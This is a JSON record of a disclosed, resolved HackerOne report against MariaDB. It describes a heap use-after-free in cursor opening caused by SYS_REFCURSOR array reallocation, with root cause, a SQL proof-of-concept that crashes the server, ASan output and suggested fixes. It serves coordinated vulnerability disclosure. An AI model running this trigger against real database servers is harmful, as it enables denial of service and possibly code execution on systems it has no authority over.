@@ -1,0 +1,126 @@
+{
+  "id": 3915935,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTE1OTM1",
+  "url": "https://hackerone.com/reports/3915935",
+  "title": "Heap Use-After-Free in Materialized_cursor::open via SYS_REFCURSOR Array Reallocation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-08-04T14:50:13.246Z",
+  "submitted_at": "2026-08-04T14:50:13.979Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "akkoul",
+    "url": "/akkoul",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:46:11.670Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:46:02.892Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Describe the vulnerability here.## Summary\n\nMariaDB 13.1.0-alpha (current main branch) contains a heap-use-after-free vulnerability in `mysql_open_cursor()` that was NOT fixed by MDEV-40396. An authenticated user with CREATE FUNCTION privilege can achieve remote code execution on the database server.\n\n## Root Cause\n\nIn `sp_cursor::open()` (sql/sp_rcontext.cc:845):\n```cpp\nmysql_open_cursor(thd, &result, &server_side_cursor, cursor_name, return_type)\n```\n\nThe addresses `&result` and `&server_side_cursor` are members of `this` (an `sp_cursor` inside the `m_statement_cursors` Dynamic_array). During `mysql_execute_command()` inside `mysql_open_cursor()`, if the cursor's SELECT calls a function that opens additional SYS_REFCURSORs, the Dynamic_array reallocates its backing buffer, freeing the old memory.\n\nAfter `mysql_execute_command()` returns:\n- Line 250 (sql/sql_cursor.cc): `materialized_cursor->open(result, 0)` — virtual call through dangling `result` pointer → instruction pointer control\n- Line 255: `*pcursor = materialized_cursor` — write to dangling `pcursor` → heap corruption\n\nMDEV-40396 (fixed Jul 17, 2026) addressed a DIFFERENT manifestation: it removed the `select_result*` STORED member from `Server_side_cursor`. But the PARAMETERS passed from `sp_cursor::open()` to `mysql_open_cursor()` at the call site (line 845) were NOT changed and remain dangling after reallocation.\n\n## Steps to Reproduce\n\n```sql\n-- MariaDB 13.x with SYS_REFCURSOR support\n-- Requires: CREATE FUNCTION privilege\n\nCREATE DATABASE IF NOT EXISTS test;\nUSE test;\n\nDELIMITER //\n\n-- Function that forces cursor array reallocation (17 > default 16 slots)\nCREATE OR REPLACE FUNCTION trigger_realloc() RETURNS INT\nBEGIN\n  DECLARE c1  SYS_REFCURSOR;\n  DECLARE c2  SYS_REFCURSOR;\n  DECLARE c3  SYS_REFCURSOR;\n  DECLARE c4  SYS_REFCURSOR;\n  DECLARE c5  SYS_REFCURSOR;\n  DECLARE c6  SYS_REFCURSOR;\n  DECLARE c7  SYS_REFCURSOR;\n  DECLARE c8  SYS_REFCURSOR;\n  DECLARE c9  SYS_REFCURSOR;\n  DECLARE c10 SYS_REFCURSOR;\n  DECLARE c11 SYS_REFCURSOR;\n  DECLARE c12 SYS_REFCURSOR;\n  DECLARE c13 SYS_REFCURSOR;\n  DECLARE c14 SYS_REFCURSOR;\n  DECLARE c15 SYS_REFCURSOR;\n  DECLARE c16 SYS_REFCURSOR;\n  DECLARE c17 SYS_REFCURSOR;\n  OPEN c1  FOR SELECT 1;\n  OPEN c2  FOR SELECT 1;\n  OPEN c3  FOR SELECT 1;\n  OPEN c4  FOR SELECT 1;\n  OPEN c5  FOR SELECT 1;\n  OPEN c6  FOR SELECT 1;\n  OPEN c7  FOR SELECT 1;\n  OPEN c8  FOR SELECT 1;\n  OPEN c9  FOR SELECT 1;\n  OPEN c10 FOR SELECT 1;\n  OPEN c11 FOR SELECT 1;\n  OPEN c12 FOR SELECT 1;\n  OPEN c13 FOR SELECT 1;\n  OPEN c14 FOR SELECT 1;\n  OPEN c15 FOR SELECT 1;\n  OPEN c16 FOR SELECT 1;\n  OPEN c17 FOR SELECT 1;\n  RETURN 1;\nEND//\n\nCREATE OR REPLACE PROCEDURE trigger_uaf()\nBEGIN\n  DECLARE c SYS_REFCURSOR;\n  OPEN c FOR SELECT trigger_realloc();\nEND//\n\nDELIMITER ;\n\nSET SESSION max_open_cursors = 100;\nCALL trigger_uaf();\n-- Server crashes with heap-use-after-free\n```\n\n## ASan Output\n\n```\n==61==ERROR: AddressSanitizer: heap-use-after-free on address 0xffffb380f0c0\nSUMMARY: AddressSanitizer: heap-use-after-free /opt/mariadb/sql/sql_cursor.cc:250:15\n    in Materialized_cursor::open(select_result*, JOIN*)\n```\n\nBuild: MariaDB 13.1.0-alpha (main branch HEAD, Aug 2026) with `-DWITH_ASAN=ON`.\n\n## Suggested Fix\n\nPass `result` and `server_side_cursor` by refreshing them after `mysql_execute_command`, not before:\n\n```cpp\n// Option 1: Refresh parameters after execute\n// In mysql_open_cursor, after mysql_execute_command returns,\n// re-derive result from the current (possibly moved) sp_cursor\n\n// Option 2: Pin the Dynamic_array during cursor open\n// Prevent m_statement_cursors from reallocating while\n// mysql_open_cursor holds references into it (e.g., reserve capacity)\n\n// Option 3: Store results in a separate non-movable allocation\n// Similar to what MDEV-40396 did for Server_side_cursor::select,\n// but applied to the call-site parameters\n```\n\n## Relationship to MDEV-40396\n\nMDEV-40396 (commit 9b075b2c, Jul 17 2026) fixed a related but DIFFERENT issue:\n- MDEV-40396 removed `Server_side_cursor::select` (a STORED member that became stale)\n- THIS BUG: the PARAMETERS `&result` and `&server_side_cursor` passed from `sp_cursor::open()` to `mysql_open_cursor()` at the call site (sp_rcontext.cc:845) become stale during execution\n\nThe fix at MDEV-40396 did NOT change line 845 of sp_rcontext.cc.\n\n## Impact\n\n- **Remote Code Execution**: The dangling `result` pointer is used for a virtual method call. If the freed memory is reclaimed with attacker-controlled content (via concurrent session allocations), the vtable dispatch executes attacker-controlled code.\n- **Heap Corruption**: `*pcursor = materialized_cursor` writes 8 bytes to freed memory, corrupting whatever reuses that allocation.\n- **Privilege Required**: CREATE FUNCTION (available to any user with a database, common in shared hosting).\n- **Affects**: MariaDB 13.0.x and 13.1.x (any version with SYS_REFCURSOR support).",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:46:03.088Z",
+  "allow_singular_disclosure_after": -4991.944515465,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "inzamulsepoy"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10334,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Remote Code Execution",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
